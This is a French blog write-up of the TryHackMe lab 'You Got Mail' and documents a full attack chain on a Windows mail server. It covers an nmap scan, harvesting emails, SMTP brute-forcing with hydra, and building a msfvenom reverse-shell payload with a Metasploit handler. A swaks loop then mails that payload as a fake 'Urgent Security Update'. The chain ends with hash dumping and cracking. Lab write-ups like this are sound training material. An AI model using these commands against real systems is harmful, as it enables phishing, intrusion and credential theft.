@@ -1,0 +1,121 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>THM: You Got Mail</title>
+<meta name=description content="Platforme: TryHackMe Lien: You Got Mail Niveau: Moyen OS: Windows Cette room présente une attaque par hameçonnage. Après avoir collecté une liste …"><meta name=keywords content="TryHackMe"><meta property="og:url" content="https://scorpiosec.com/fr/posts/thm-you-got-mail/"><meta property="og:type" content="website"><meta property="og:title" content="THM: You Got Mail"><meta property="og:description" content="Platforme: TryHackMe Lien: You Got Mail Niveau: Moyen OS: Windows Cette room présente une attaque par hameçonnage. Après avoir collecté une liste …"><meta property="og:image" content="https://scorpiosec.com/images/THM-YouGotMail/YGM.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/THM-YouGotMail/YGM.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="THM: You Got Mail"><meta name=twitter:description content="Platforme: TryHackMe Lien: You Got Mail Niveau: Moyen OS: Windows Cette room présente une attaque par hameçonnage. Après avoir collecté une liste …"><meta property="twitter:domain" content="https://scorpiosec.com/fr/posts/thm-you-got-mail/"><meta property="twitter:url" content="https://scorpiosec.com/fr/posts/thm-you-got-mail/"><meta name=twitter:image content="https://scorpiosec.com/images/THM-YouGotMail/YGM.png"><link rel=canonical href=https://scorpiosec.com/fr/posts/thm-you-got-mail/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/fr/posts/ aria-label=posts><span data-feather=book></span> Postes</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/projects/ aria-label=projects><span data-feather=code></span> Projets</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/tags/ aria-label=tags><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/categories/ aria-label=categories><span data-feather=folder></span> Catégories</a></div><div class=nav-link><a href=https://scorpiosec.com/ aria-label></a></div><div class="nav-link language-switcher"><a href=/posts/thm-you-got-mail/>English</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
+<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
+<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/fr/posts/><span data-feather=book></span> Postes</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/projects/><span data-feather=code></span> Projets</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/categories/><span data-feather=folder></span> Catégories</a></li><li class=nav-item><a href=https://scorpiosec.com/></a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
+<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>THM: You Got Mail</h1><small role=doc-subtitle></small><p class=post-date>5 min read |
+<span class=post-date>9 Février 2025</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/fr/tags/tryhackme>TryHackMe</a></li></ul></div><div class=post-content><ul><li>Platforme: TryHackMe</li><li>Lien: <a href=https://tryhackme.com/room/yougotmail>You Got Mail</a></li><li>Niveau: Moyen</li><li>OS: Windows</li></ul><hr><p>Cette room présente une attaque par hameçonnage. Après avoir collecté une liste d&rsquo;emails, nous utilisons <code>cewl</code> pour créer une liste de mots de passe personnalisée. Hydra récupère avec succès le mot de passe de l&rsquo;un des e-mails. Avec <code>swaks</code>, nous envoyons un email de phishing qui aboutit à un reverse shell sur le système cible. À partir de là, nous récupérons le mot de passe d&rsquo;un compte utilisateur ainsi que le mot de passe administrateur de <code>hMailServer</code>.</p><h2 id=balayage>Balayage</h2><pre tabindex=0><code>nmap -T4 -n -sC -sV -Pn -p- {TARGET_IP}
+</code></pre><p><strong>Résultats</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2025-02-10 17:28 CST
+</span></span><span style=display:flex><span>Warning: 10.10.16.179 giving up on port because retransmission cap hit <span style=color:#56b6c2>(</span>6<span style=color:#56b6c2>)</span>.
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.16.179
+</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.18s latency<span style=color:#56b6c2>)</span>.
+</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>65504</span> closed tcp ports <span style=color:#56b6c2>(</span>conn-refused<span style=color:#56b6c2>)</span>
+</span></span><span style=display:flex><span>PORT      STATE    SERVICE       VERSION
+</span></span><span style=display:flex><span>25/tcp    open     smtp          hMailServer smtpd
+</span></span><span style=display:flex><span>| smtp-commands: BRICK-MAIL, SIZE 20480000, AUTH LOGIN, HELP
+</span></span><span style=display:flex><span>|_ <span style=color:#d19a66>211</span> DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>110/tcp   open     pop3          hMailServer pop3d
+</span></span><span style=display:flex><span>|_pop3-capabilities: USER UIDL TOP
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>135/tcp   open     msrpc         Microsoft Windows RPC
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>143/tcp   open     imap          hMailServer imapd
+</span></span><span style=display:flex><span>|_imap-capabilities: CAPABILITY IDLE QUOTA <span style=color:#e06c75>RIGHTS</span><span style=color:#56b6c2>=</span>texkA0001 CHILDREN NAMESPACE completed IMAP4 ACL IMAP4rev1 OK SORT
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>445/tcp   open     microsoft-ds?
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>587/tcp   open     smtp          hMailServer smtpd
+</span></span><span style=display:flex><span>| smtp-commands: BRICK-MAIL, SIZE 20480000, AUTH LOGIN, HELP
+</span></span><span style=display:flex><span>|_ <span style=color:#d19a66>211</span> DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>3389/tcp  open     ms-wbt-server Microsoft Terminal Services
+</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>BRICK-MAIL
+</span></span><span style=display:flex><span>| Not valid before: 2025-02-09T21:23:09
+</span></span><span style=display:flex><span>|_Not valid after:  2025-08-11T21:23:09
+</span></span><span style=display:flex><span>| rdp-ntlm-info: 
+</span></span><span style=display:flex><span>|   Target_Name: BRICK-MAIL
+</span></span><span style=display:flex><span>|   NetBIOS_Domain_Name: BRICK-MAIL
+</span></span><span style=display:flex><span>|   NetBIOS_Computer_Name: BRICK-MAIL
+</span></span><span style=display:flex><span>|   DNS_Domain_Name: BRICK-MAIL
+</span></span><span style=display:flex><span>|   DNS_Computer_Name: BRICK-MAIL
+</span></span><span style=display:flex><span>|   Product_Version: 10.0.17763
+</span></span><span style=display:flex><span>|_  System_Time: 2025-02-10T23:43:35+00:00
+</span></span><span style=display:flex><span>|_ssl-date: 2025-02-10T23:43:42+00:00; 0s from scanner time.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>4349/tcp  filtered fsportmap
+</span></span><span style=display:flex><span>4750/tcp  filtered ssad
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 <span style=color:#56b6c2>(</span>SSDP/UPnP<span style=color:#56b6c2>)</span>
+</span></span><span style=display:flex><span>|_http-title: Not Found
+</span></span><span style=display:flex><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>17854/tcp filtered unknown
+</span></span><span style=display:flex><span>18527/tcp filtered unknown
+</span></span><span style=display:flex><span>22815/tcp filtered unknown
+</span></span><span style=display:flex><span>24814/tcp filtered unknown
+</span></span><span style=display:flex><span>30513/tcp filtered unknown
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>47001/tcp open     http          Microsoft HTTPAPI httpd 2.0 <span style=color:#56b6c2>(</span>SSDP/UPnP<span style=color:#56b6c2>)</span>
+</span></span><span style=display:flex><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style=display:flex><span>|_http-title: Not Found
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>47010/tcp filtered unknown
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>49664/tcp open     msrpc         Microsoft Windows RPC
+</span></span><span style=display:flex><span>49665/tcp open     msrpc         Microsoft Windows RPC
+</span></span><span style=display:flex><span>49666/tcp open     msrpc         Microsoft Windows RPC
+</span></span><span style=display:flex><span>49667/tcp open     msrpc         Microsoft Windows RPC
+</span></span><span style=display:flex><span>49668/tcp open     msrpc         Microsoft Windows RPC
+</span></span><span style=display:flex><span>49669/tcp open     msrpc         Microsoft Windows RPC
+</span></span><span style=display:flex><span>49671/tcp open     msrpc         Microsoft Windows RPC
+</span></span><span style=display:flex><span>49674/tcp open     msrpc         Microsoft Windows RPC
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>50388/tcp filtered unknown
+</span></span><span style=display:flex><span>51348/tcp filtered unknown
+</span></span><span style=display:flex><span>53546/tcp filtered unknown
+</span></span><span style=display:flex><span>62352/tcp filtered unknown
+</span></span><span style=display:flex><span>64819/tcp filtered unknown
+</span></span><span style=display:flex><span>Service Info: Host: BRICK-MAIL; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Host script results:
+</span></span><span style=display:flex><span>| smb2-time: 
+</span></span><span style=display:flex><span>|   date: 2025-02-10T23:43:34
+</span></span><span style=display:flex><span>|_  start_date: N/A
+</span></span><span style=display:flex><span>| smb2-security-mode: 
+</span></span><span style=display:flex><span>|   3:1:1: 
+</span></span><span style=display:flex><span>|_    Message signing enabled but not required
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 947.53 seconds
+</span></span></code></pre></div><p>Nmap trouve quelques services Windows (SMB et MSRPC), quelques services de messagerie (SMTP et POP3), et des serveurs web. De plus, nous sommes autorisés à faire de la reconnaissance passive sur <code>https://brownbrick.co/</code>.</p><h2 id=enumération>Enumération</h2><p>A <code>https://brownbrick.co/</code> nous trouvons un site web statique.</p><p><img src=/images/THM-YouGotMail/YGM_website.png alt="target website"></p><p>Étant donné la consigne de n&rsquo;effectuer qu&rsquo;une reconnaissance passive sur <code>https://brownbrick.co/</code>, il est inutile d&rsquo;essayer de forcer les répertoires ou d&rsquo;énumérer les sous-domaines.</p><p>Sur la page &ldquo;Our Team&rdquo; à <code>https://brownbrick.co/menu.html</code>, nous recueillons quelques emails.</p><p><img src=/images/THM-YouGotMail/emails_list.png alt="email list"></p><pre tabindex=0><code>oaurelius@brownbrick.co
+tchikondi@brownbrick.co
+wrohit@brownbrick.co
+pcathrine@brownbrick.co
+lhedvig@brownbrick.co
+fstamatis@brownbrick.co
+</code></pre><p>Nous pouvons envoyer des données à <code>https://brownbrick.co/reservation.html?</code> mais rien ne semble exploitable.</p><p>Nous pouvons également envoyer des informations à <code>https://brownbrick.co/contact.html</code> mais on nous dit que le serveur de messagerie ne répond pas.</p><p><img src=/images/THM-YouGotMail/server_no_response.png alt="No response from the email server"></p><p>Créons une liste de mots de passe personnalisée avec <code>cewl</code>.</p><pre tabindex=0><code>cewl --lowercase https://brownbrick.co/ &gt; pwds.txt
+</code></pre><p><img src=/images/THM-YouGotMail/custom_pwds_list.png alt="custom password list with cewl"></p><p>En utilisant hydra, nous effectuons une attaque par force brute avec les mots de passe générés.</p><pre tabindex=0><code>hydra -L emails.txt -P pwds.txt {TARGET_IP} smtp -s 587 
+</code></pre><blockquote><p>Les ports utilisés par le SMTP ont des objectifs différents. Le port 587 est utilisé pour envoyer des courriels de clients à des serveurs de messagerie (soumission SMTP), tandis que le port 25 est utilisé pour la transmission de courriels de serveur à serveur (relais SMTP).</p></blockquote><p>Nous trouvons une correspondance pour <code>lhedvig@brownbrick.co:bricks</code>.</p><p><img src=/images/THM-YouGotMail/hydra_smtp.png alt="hydra SMTP brute force attack"></p><p>Nous pouvons tester la connexion à une boîte aux lettres spécifique via POP3 en utilisant TELNET, mais elle s&rsquo;avère vide.</p><pre tabindex=0><code>telnet {TARGET_IP} 110
+USER lhedvig@brownbrick.co
+PASS bricks
+</code></pre><p><img src=/images/THM-YouGotMail/telnet_check.png alt="Mailbox access via telnet"></p><h2 id=drapeau-utilisateur>Drapeau utilisateur</h2><p>Essayons d&rsquo;envoyer quelques messages électroniques avec une pièce jointe malveillante.</p><ul><li>Nous créons un fichier exe malveillant avec msfvenom à utiliser comme pièce jointe.</li></ul><pre tabindex=0><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=443 -f exe &gt; payload.exe
+</code></pre><ul><li>Nous configurons un listener avec Metasploit.</li></ul><pre tabindex=0><code>use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST YOUR_IP
+set LPORT PORT_NUMBER
+run
+</code></pre><p>Nous pouvons envoyer un courriel à toutes les autres adresses électroniques à l&rsquo;aide de <a href=https://github.com/jetmore/swaks>swaks</a>.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#c678dd>for</span> email in oaurelius@brownbrick.co tchikondi@brownbrick.co wrohit@brownbrick.co pcathrine@brownbrick.co fstamatis@brownbrick.co; <span style=color:#c678dd>do</span>
+</span></span><span style=display:flex><span>    swaks --to <span style=color:#e06c75>$email</span> --from lhedvig@brownbrick.co <span style=color:#98c379>\
+</span></span></span><span style=display:flex><span><span style=color:#98c379></span>    --server 10.10.16.179 --port <span style=color:#d19a66>25</span> --auth LOGIN <span style=color:#98c379>\
+</span></span></span><span style=display:flex><span><span style=color:#98c379></span>    --auth-user lhedvig@brownbrick.co --auth-password bricks <span style=color:#98c379>\
+</span></span></span><span style=display:flex><span><span style=color:#98c379></span>    --header <span style=color:#98c379>&#34;Subject: Urgent Security Update&#34;</span> <span style=color:#98c379>\
+</span></span></span><span style=display:flex><span><span style=color:#98c379></span>    --body <span style=color:#98c379>&#34;Please review the attachment&#34;</span> <span style=color:#98c379>\
+</span></span></span><span style=display:flex><span><span style=color:#98c379></span>    --attach @payload.exe
+</span></span><span style=display:flex><span><span style=color:#c678dd>done</span>
+</span></span></code></pre></div><p><img src=/images/THM-YouGotMail/swaks_send_emails.png alt="Emails sent via swaks"></p><p>Nous obtenons un shell en tant que <code>wrohit</code> et pouvons lire le drapeau utilisateur.</p><p><img src=/images/THM-YouGotMail/flag_txt.png alt="user flag"></p><p>Avec <code>net localgroup</code> nous remarquons que cet utilisateur fait partie du groupe <code>Administrators</code> en plus de beaucoup d&rsquo;autres.</p><p><img src=/images/THM-YouGotMail/group_memberships.png alt="group memberships"></p><h3 id=récupération-du-mot-de-passe-wrohit>Récupération du mot de passe wrohit</h3><p>Puisque nous avons des privilèges élevés, dans notre shell meterpreter nous utilisons <code>hashdump</code> pour récupérer les hashs des mots de passe des utilisateurs.</p><p><img src=/images/THM-YouGotMail/hashdump.png alt="hashdump command"></p><p>En utilisant <a href=https://crackstation.net/>CrackStation</a>, nous récupérons le mot de passe de <code>wrohit</code>.</p><p><img src=/images/THM-YouGotMail/wrohit_pwd.png alt="wrohit password"></p><h2 id=mot-de-passe-administrateur-hmailserver>Mot de passe administrateur hMailServer</h2><p>Le hachage du mot de passe de <code>hMailServer Administrator Dashboard</code> se trouve dans <code>C:\Program Files (x86)\hMailServer\Bin\hMailServer.INI</code>.</p><p><img src=/images/THM-YouGotMail/admin_pwd.png alt="hMailServer password hash"></p><p>Nous pouvons également le cracker avec <a href=https://crackstation.net/>CrackStation</a>.</p><p><img src=/images/THM-YouGotMail/cracked_admin_pwd.png alt="hMailServer admin password"></p></div><div class=prev-next><div class=prev-post><p><a href=/fr/posts/htb-trickster/>&#8592;
+Précédent:
+HTB: Trickster</a></p><p class=prev-post-date>janvier 31, 2025</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
+<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#balayage>Balayage</a></li><li><a href=#enumération>Enumération</a></li><li><a href=#drapeau-utilisateur>Drapeau utilisateur</a><ul><li><a href=#récupération-du-mot-de-passe-wrohit>Récupération du mot de passe wrohit</a></li></ul></li><li><a href=#mot-de-passe-administrateur-hmailserver>Mot de passe administrateur hMailServer</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2025 K-Scorpio</span>
+<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>
